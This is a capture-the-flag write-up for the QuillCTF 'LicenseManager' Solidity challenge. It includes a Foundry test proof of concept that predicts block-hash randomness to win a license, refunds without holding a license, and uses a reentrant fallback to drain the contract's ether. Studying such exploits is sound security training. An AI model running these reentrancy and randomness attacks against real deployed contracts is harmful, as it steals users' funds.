---
title: QuillCTF - LicenseManager
description: 2023 | Medium | Solidity Security
tags:
    - smart contract
    - weak randomness
    - reentrancy
---

## Objective of CTF

> Get the license and find at least **two** ways to collect the ethers in the contract before the owner notices

[QuillCTF Challenges - LicenseManager](https://quillctf.super.site/challenges/licensemanager)

## Vulnerability Description

- As an attacker, we can get a license with 0.01 ether through `winLicense()`. pickedNumber should be less than maxThreshold to get the license. We can not change the msg.value because we only have 0.01 ether which is the minimum required amount. Thus, we just wait until the block hash of the previous block satisfies the condition.
- Since `refundLicense()` does not check if msg.sender is in the `licensed` array, we can refund the license and get 1 ether.

> collect the ethers in the contract before the owner notices in second way

- We can buy a license since we have 1 ether this time. The licenseOwners is set to false after ETH transfer, so we can reentrant `refundLicense()` to get more ETH.

## Proof of Concept

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/LicenseManager.sol";

/** 
 * @title Test contract for LicenseManager
 */
contract LicenseManagerTest is Test {

    LicenseManager license;

    address owner = makeAddr("owner");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address user4 = makeAddr("user4");

    address attacker = makeAddr("attacker");
    
    function setUp() public {
        vm.prank(owner);
        license = new LicenseManager();

        vm.deal(user1, 1 ether);
        vm.deal(user2, 1 ether);
        vm.deal(user3, 1 ether);
        vm.deal(user4, 1 ether);

        vm.prank(user1);
        license.buyLicense{value: 1 ether}();

        vm.prank(user2);
        license.buyLicense{value: 1 ether}();

        vm.prank(user3);
        license.buyLicense{value: 1 ether}();

        vm.prank(user4);
        license.buyLicense{value: 1 ether}();

    }

    function test_exploit1_2() public {
        vm.deal(attacker, 0.01 ether);
        vm.startPrank(attacker);

        // Challenge 1 solution
        uint pickedNumber = uint(keccak256(abi.encodePacked(uint256(0.01 ether), attacker, uint(1337), blockhash(block.number - 1)))) % 100;
        uint maxThreshold = uint(0.01 ether / 1e16);
        while (pickedNumber >= maxThreshold) {
            vm.roll(block.number + 1);
            pickedNumber = uint(keccak256(abi.encodePacked(uint256(0.01 ether), attacker, uint(1337), blockhash(block.number - 1)))) % 100;
        }
        license.winLicense{value: 0.01 ether}();
        // End

        assertEq(true, license.checkLicense());
        vm.stopPrank();
						
        vm.startPrank(attacker);

        // Challenge 2.1 solution
        license.refundLicense();
        // End

        assertGt(attacker.balance, 0.1 ether);
        vm.stopPrank();
    }

	/// collect the ethers in the contract before the owner notices in second way.
    function test_exploit3() public {
        vm.deal(address(this), 1 ether);

        // challenge 2.2 solution
        license.buyLicense{value: 1 ether}();
        license.refundLicense();
        // End

        console.log("\tFinal Balance\t", address(this).balance);
        assertGt(address(this).balance, 1 ether);
    }

    fallback() external payable {
        if (msg.sender.balance >= 1 ether)
            license.refundLicense();
    }
}
```